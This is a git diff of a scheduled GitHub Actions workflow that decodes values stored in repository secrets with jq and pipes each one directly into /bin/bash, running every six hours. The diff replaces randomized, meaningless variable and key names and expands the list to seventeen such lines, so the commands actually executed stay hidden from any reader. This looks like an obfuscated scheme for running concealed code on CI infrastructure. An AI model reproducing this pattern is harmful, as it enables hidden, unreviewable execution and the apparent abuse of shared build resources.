@@ -1,10 +1,8 @@
 name: caohong19870101
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 4/6 * * *'
-
+    - cron: '15 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,12 +10,23 @@ jobs:
       - uses: actions/checkout@v4
       - name: caohong19870101
         env:
-          ur6281: ${{ secrets.ur6281 }}
+          wyd56: ${{ secrets.wyd56 }}
         run: |
-          echo $ur6281 | jq -r .k51 | /bin/bash
-          echo $h60 | jq -r .ejd2 | /bin/bash
-          echo $tgtwe11913 | jq -r .saj4 | /bin/bash
-          echo $vwnbo64253 | jq -r .yk81 | /bin/bash
-          echo $mvz7 | jq -r .g9 | /bin/bash
-          echo $tfkng8376 | jq -r .ttlu60357 | /bin/bash
+          echo $wyd56 | jq -r .n90 | /bin/bash
+          echo $z32 | jq -r .orvu5636 | /bin/bash
+          echo $xh5 | jq -r .hk1 | /bin/bash
+          echo $edo1 | jq -r .oiv6450 | /bin/bash
+          echo $z13 | jq -r .xohcw48256 | /bin/bash
+          echo $hz48 | jq -r .b633 | /bin/bash
+          echo $mhen54586 | jq -r .jmykc99 | /bin/bash
+          echo $spbm1277 | jq -r .q0 | /bin/bash
+          echo $rx2 | jq -r .useaf19 | /bin/bash
+          echo $a827 | jq -r .mwj17450 | /bin/bash
+          echo $c8624 | jq -r .uk5587 | /bin/bash
+          echo $r34 | jq -r .tzwi4 | /bin/bash
+          echo $x0000 | jq -r .mytg77271 | /bin/bash
+          echo $u7 | jq -r .w8 | /bin/bash
+          echo $twwt38 | jq -r .qsc0 | /bin/bash
+          echo $rb69682 | jq -r .vivgw4 | /bin/bash
+          echo $vw1821 | jq -r .ougz86 | /bin/bash
 
